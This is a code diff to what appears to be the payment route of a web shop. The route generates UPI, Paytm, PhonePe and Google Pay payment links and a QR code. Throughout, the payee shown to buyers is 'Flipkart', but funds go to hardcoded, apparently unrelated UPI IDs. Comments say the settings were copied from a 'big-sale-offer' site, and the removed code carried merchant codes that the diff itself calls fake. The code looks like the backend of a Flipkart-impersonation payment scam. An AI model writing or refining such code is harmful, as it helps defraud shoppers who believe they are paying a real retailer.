@@ -29,10 +29,10 @@ export async function POST(request: Request) {
     const upiSettings = upiRecord?.value || {};
     const globalSettings = settingsRecord?.value?.payment || {};
 
-    const defaultUpi = globalSettings.upi || upiSettings.upi || globalSettings.merchantUpiId || process.env.UPI_ID || process.env.MERCHANT_UPI_ID || 'paytm.s27z8uz@pty';
-    const phonepeUpi = globalSettings.upi2 || upiSettings.upi2 || defaultUpi;
-    const paytmUpi = globalSettings.upi3 || upiSettings.upi3 || defaultUpi;
-    const storeName = globalSettings.payeeName || process.env.STORE_NAME || 'Flipkart';
+    const defaultUpi = (globalSettings.upi || upiSettings.upi || globalSettings.merchantUpiId || process.env.UPI_ID || process.env.MERCHANT_UPI_ID || '03400C123L@mairtel').trim();
+    const phonepeUpi = (globalSettings.upi2 || upiSettings.upi2 || defaultUpi).trim();
+    const paytmUpi = (globalSettings.upi3 || upiSettings.upi3 || defaultUpi).trim();
+    const storeName = (globalSettings.payeeName || process.env.STORE_NAME || 'Flipkart').trim();
 
     // 2. Determine order and transaction ID to use
     let orderIdToUse = orderId;
@@ -102,23 +102,21 @@ export async function POST(request: Request) {
     }
 
     // 4. Generate UPI URLs
-    const orderNote = `Paying To Flipkart ORDER${orderIdToUse || txnid}`;
-    // Universal upi://pay link (uses default UPI ID)
-    const upiUrl = `upi://pay?pa=${defaultUpi}&am=${Math.round(Number(amount))}&pn=${encodeURIComponent('Raju Traders')}&tn=${encodeURIComponent(orderNote)}&tr=${txnid}&cu=INR`;
-
-    // Dynamic QR code URL via free stable QR API
-    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(upiUrl)}&size=220x220`;
-
     const orderAmt = Number(amount).toFixed(2);
+    const orderNote = `Paying To Flipkart ORDER${orderIdToUse || txnid}`;
+    const encName = encodeURIComponent(storeName);
+    const encNote = encodeURIComponent(orderNote);
 
-    // Paytm Intent Link (exact setting copied from newsale.big-sale-offer.com)
-    const paytmIntent = `paytmmp://cash_wallet/?pa=${paytmUpi}&pn=${encodeURIComponent(storeName)}&am=${orderAmt}&cu=INR&tn=${encodeURIComponent(orderNote)}&featuretype=money_transfer`;
+    // Universal standard NPCI UPI link
+    const upiUrl = `upi://pay?pa=${defaultUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${txnid}`;
 
-    // PhonePe Intent Link (from reference site settings)
-    const phonepeIntent = `phonepe://pay?ver=01&mode=19&pa=${phonepeUpi}&pn=Paying_to_Flipkart&tr=${txnid}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${orderAmt}`;
+    // Dynamic QR code URL
+    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(upiUrl)}&size=300x300`;
 
-    // Google Pay (GPay) Intent Link (from reference site settings)
-    const gpayIntent = `tez://upi/pay?pa=${defaultUpi}&pn=Paying_to_Flipkart&mc=3526&tr=${txnid}&am=${orderAmt}&cu=INR&tn=Recharge`;
+    // Direct Intent links without fake merchant codes
+    const paytmIntent = `paytmmp://pay?pa=${paytmUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${txnid}`;
+    const phonepeIntent = `phonepe://pay?pa=${phonepeUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${txnid}`;
+    const gpayIntent = `tez://upi/pay?pa=${defaultUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${txnid}`;
 
     return NextResponse.json({
       success: true,
@@ -130,7 +128,9 @@ export async function POST(request: Request) {
       phonepeIntent,
       gpayIntent,
       merchantName: storeName,
-      upiId: defaultUpi
+      upiId: defaultUpi,
+      phonepeUpi,
+      paytmUpi
     });
   } catch (error: any) {
     console.error('Initiate Payment Error:', error);
